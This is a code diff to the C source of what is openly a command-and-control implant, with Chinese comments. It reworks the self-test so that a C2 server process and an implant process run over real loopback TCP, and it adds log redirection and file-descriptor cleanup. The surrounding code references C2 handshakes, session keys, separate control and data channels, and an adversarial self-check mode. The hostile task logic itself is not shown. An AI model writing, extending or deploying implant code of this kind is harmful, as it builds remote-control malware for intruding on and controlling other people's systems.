@@ -21,7 +21,9 @@
  * ====================================================================
  *   ./implant                 植入体模式：连 C2，跑主循环
  *   ./implant --server        C2 侧模式：监听，驱动一次完整任务闭环
- *   ./implant --selftest      进程内 fork 两端，端到端真跑并输出判定
+ *   ./implant --selftest      真实 TCP 双进程（server + implant），端到端真跑
+ *                             服务端 stdout/stderr 写文件不写管道，因此不会
+ *                             让上层命令等 EOF 挂起，可安全进入回归脚本
  *   ./implant --check         只跑对抗自检并输出结论
  *
  * 控制面与数据面走**两条独立连接**：
@@ -45,6 +47,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
+#include <dirent.h>
+#include <fcntl.h>
 
 #include "defense.h"
 #include "c2.h"
@@ -773,83 +777,191 @@ static int tcp_connect(const mono_cfg_t *cfg)
 }
 
 /* ====================================================================
- * selftest：进程内 fork 两端，端到端真跑
+ * selftest：真实 TCP 双进程
+ *
+ * 与上一版（socketpair + 继承父进程 stdout/stderr）的差别有三条，全部指向
+ * 同一个现象——"上层命令挂起"：
+ *
+ *  1) 走真实 TCP 而不是 socketpair。顺带验证了 --server / --implant 这条
+ *     真实部署路径本身，而不是只在内存里做转换。
+ *
+ *  2) 子进程的 stdout/stderr 重定向到文件，不再 dup 自父进程的管道。
+ *     这是挂起的直接原因：子进程持有管道写端，进程早已退出，上层却永远
+ *     等不到 EOF。现象是"命令卡住"，与业务逻辑毫无关系，极难定位。
+ *
+ *  3) 子进程关闭全部 fd >= 3（监听 fd 除外）。任何被继承的描述符都不会
+ *     继续持有上层管道。
+ *
+ * 监听 fd 由父进程在 fork 之前 bind 到端口 0 并取得实际端口，再被子进程
+ * 继承。因此不存在"父进程先关、子进程再 bind"的竞争窗口。
  * ==================================================================== */
 
-static int run_selftest(const mono_cfg_t *cfg)
+/*
+ * selftest 失败时把服务端日志回显到 stderr。
+ * 服务端输出写的是文件而不是管道——这是"上层等 EOF 挂起"的根因修复——
+ * 代价是失败时必须主动把它读出来，否则服务端一侧的失败原因永远看不到。
+ * 只回显末尾若干字节，避免大日志淹没上层输出。
+ */
+static void dump_srv_log(const char *path)
 {
-    int sp_cmd[2], sp_data[2];
+    FILE *f = fopen(path, "rb");
+    char buf[4096];
+    size_t n;
+
+    if (!f) return;
+    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return; }
+    {
+        long sz = ftell(f);
+        long off = sz > (long)(sizeof buf - 1) ? sz - (long)(sizeof buf - 1) : 0;
+        if (fseek(f, off, SEEK_SET) != 0) { fclose(f); return; }
+    }
+    n = fread(buf, 1, sizeof buf - 1, f);
+    buf[n] = '\0';
+    fclose(f);
+    fprintf(stderr, "[selftest] ---- 服务端日志（尾部）----\n%s\n"
+                    "[selftest] ---- 日志结束 ----\n", buf);
+}
+
+/*
+ * 关闭 [low, ...) 区间内除 keep 以外的全部 fd。
+ * 优先走 /proc/self/fd（精确、不受 RLIMIT_NOFILE 影响）；不可用时回退到
+ * 有限扫描。dirfd 本身必须排除，否则会在遍历途中关掉自己。
+ */
+static void close_from_except(int low, int keep)
+{
+    DIR *d = opendir("/proc/self/fd");
+    if (d) {
+        int dfd = dirfd(d);
+        struct dirent *e;
+        while ((e = readdir(d)) != NULL) {
+            int f = atoi(e->d_name);
+            if (f >= low && f != keep && f != dfd) close(f);
+        }
+        closedir(d);
+        return;
+    }
+    {
+        long mx = sysconf(_SC_OPEN_MAX);
+        int f;
+        if (mx < 0 || mx > 65536) mx = 65536;
+        for (f = low; f < (int)mx; f++) if (f != keep) close(f);
+    }
+}
+
+static int run_selftest(const mono_cfg_t *cfg_in)
+{
+    mono_cfg_t cfg = *cfg_in;
+    mono_cfg_t scfg = *cfg_in;
+    struct sockaddr_in sa;
+    socklen_t sl;
+    char logpath[256];
+    uint16_t port;
+    int lfd, one = 1;
     pid_t pid;
     int st = 0, rc = 0;
 
-    if (cfg->run_ms == 0) {
+    if (cfg.run_ms == 0) {
         /* selftest 必须有界：无上界时若帧被去重跳过，循环永不退出 */
         return -405;
     }
-    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp_cmd) != 0) return -400;
-    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp_data) != 0) {
-        close(sp_cmd[0]); close(sp_cmd[1]);
-        return -401;
-    }
+
+    lfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (lfd < 0) return -400;
+    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
+    memset(&sa, 0, sizeof sa);
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    sa.sin_port = 0;                       /* 内核分配，避免端口竞争 */
+    if (bind(lfd, (struct sockaddr *)&sa, sizeof sa) != 0) { close(lfd); return -400; }
+    if (listen(lfd, 4) != 0) { close(lfd); return -400; }
+    sl = sizeof sa;
+    if (getsockname(lfd, (struct sockaddr *)&sa, &sl) != 0) { close(lfd); return -400; }
+    port = ntohs(sa.sin_port);
+
+    snprintf(cfg.host, sizeof cfg.host, "127.0.0.1");
+    cfg.port = port;
+    scfg.port = port;
+    /* 服务端必须比植入体晚收尾，否则植入体还在跑就被判连接关闭 */
+    scfg.run_ms = cfg.run_ms + 5000;
+    snprintf(logpath, sizeof logpath, "/tmp/.mono_selftest_%ld.log", (long)getpid());
 
     pid = fork();
-    if (pid < 0) {
-        close(sp_cmd[0]); close(sp_cmd[1]);
-        close(sp_data[0]); close(sp_data[1]);
-        return -402;
-    }
+    if (pid < 0) { close(lfd); return -402; }
 
     if (pid == 0) {
-        /* 子进程 = 服务端 */
+        /* 子进程 = 服务端（真实 TCP accept） */
         c2_session_keys_t sk;
         uint8_t tsc[32];
         uint8_t pfx_s[8];
         char iid[64];
         uint64_t fr = 0;
-        int r;
-        close(sp_cmd[0]); close(sp_data[0]);
-        /*
-         * 两件事必须做，否则会留下"命令挂死"：
-         *   setsid()  —— 脱离父进程组。否则本进程属于上层（shell / 回归脚本）
-         *                的前台进程组，父进程先退出后，上层仍然会等它，
-         *                表现为命令永不返回。
-         *   PDEATHSIG —— 父进程若被 SIGKILL（超时、运维误杀、OOM），内核
-         *                直接给本进程送 SIGKILL。没有这条，父进程被强杀后
-         *                本进程变成孤儿，继续持有它继承的 fd，上层等 EOF 挂死。
-         *                这类故障的现象是"命令卡住"，与业务逻辑毫无关系，
-         *                极难定位。
-         */
+        int keep, dn, lg, cfd, dfd, r;
+
         setsid();
         prctl(PR_SET_PDEATHSIG, SIGKILL);
-        alarm(60);
-        r = hs_server(sp_cmd[1], cfg, &sk, pfx_s, tsc, iid, sizeof iid);
+        alarm(90);
+
+        keep = dup(lfd);
+        if (keep < 0) _exit(9);
+        if (keep != 3) {
+            if (dup2(keep, 3) != 3) _exit(9);
+            close(keep);
+            keep = 3;
+        }
+        dn = open("/dev/null", O_RDWR);
+        lg = open(logpath, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+        if (dn >= 0) dup2(dn, 0);
+        if (lg >= 0) { dup2(lg, 1); dup2(lg, 2); }
+        else if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); }
+        close_from_except(3, keep);
+
+        cfd = accept(keep, NULL, NULL);
+        if (cfd < 0) { fprintf(stderr, "[server] accept#1 失败\n"); _exit(4); }
+        dfd = accept(keep, NULL, NULL);
+        if (dfd < 0) { fprintf(stderr, "[server] accept#2 失败\n"); close(cfd); _exit(5); }
+
+        r = hs_server(cfd, &scfg, &sk, pfx_s, tsc, iid, sizeof iid);
         if (r != 0) {
             fprintf(stderr, "[server] 握手失败 rc=%d\n", r);
             _exit(2);
         }
-        r = server_run(sp_cmd[1], sp_data[1], cfg, &sk, tsc, &fr);
+        r = server_run(cfd, dfd, &scfg, &sk, tsc, &fr);
         memset(&sk, 0, sizeof sk);
         _exit(r == 0 ? 0 : 3);
     }
 
-    /* 父进程 = 植入体 */
-    close(sp_cmd[1]); close(sp_data[1]);
+    /* 父进程 = 植入体（真实 TCP connect） */
+    close(lfd);
     {
         c2_session_keys_t sk;
         uint8_t tsc[32], pfx[8];
         uint64_t fr = 0;
-        int r = hs_implant(sp_cmd[0], cfg, &sk, pfx, tsc);
-        if (r != 0) {
-            fprintf(stderr, "[implant] 握手失败 rc=%d\n", r);
+        int cfd, dfd, r;
+
+        cfd = tcp_connect(&cfg);
+        if (cfd < 0) {
+            fprintf(stderr, "[implant] 控制面连接失败\n");
             rc = -403;
         } else {
-            r = implant_run(sp_cmd[0], sp_data[0], cfg, &sk, tsc, &fr);
-            rc = r;
+            dfd = tcp_connect(&cfg);
+            if (dfd < 0) {
+                fprintf(stderr, "[implant] 数据面连接失败\n");
+                close(cfd);
+                rc = -403;
+            } else {
+                r = hs_implant(cfd, &cfg, &sk, pfx, tsc);
+                if (r != 0) {
+                    fprintf(stderr, "[implant] 握手失败 rc=%d\n", r);
+                    rc = -403;
+                } else {
+                    r = implant_run(cfd, dfd, &cfg, &sk, tsc, &fr);
+                    rc = r;
+                }
+                memset(&sk, 0, sizeof sk);
+                close(cfd); close(dfd);
+            }
         }
-        memset(&sk, 0, sizeof sk);
     }
-
-    close(sp_cmd[0]); close(sp_data[0]);
 
     /*
      * 确定性收尾。三条必须同时做对，缺一条就会出现假阳性或挂死：
@@ -877,11 +989,17 @@ static int run_selftest(const mono_cfg_t *cfg)
             kill(pid, SIGKILL);
             if (waitpid(pid, &st, 0) == pid) reaped = 1;
         }
-        if (!reaped) return -406;
+        if (!reaped) { dump_srv_log(logpath); return -406; }
     }
 
-    if (rc != 0) return rc;
-    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) return -404;
+    if (rc != 0) { dump_srv_log(logpath); return rc; }
+    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
+        fprintf(stderr, "[selftest] 服务端退出码=%d\n",
+                WIFEXITED(st) ? WEXITSTATUS(st) : -1);
+        dump_srv_log(logpath);
+        return -404;
+    }
+    unlink(logpath);
     return 0;
 }
 
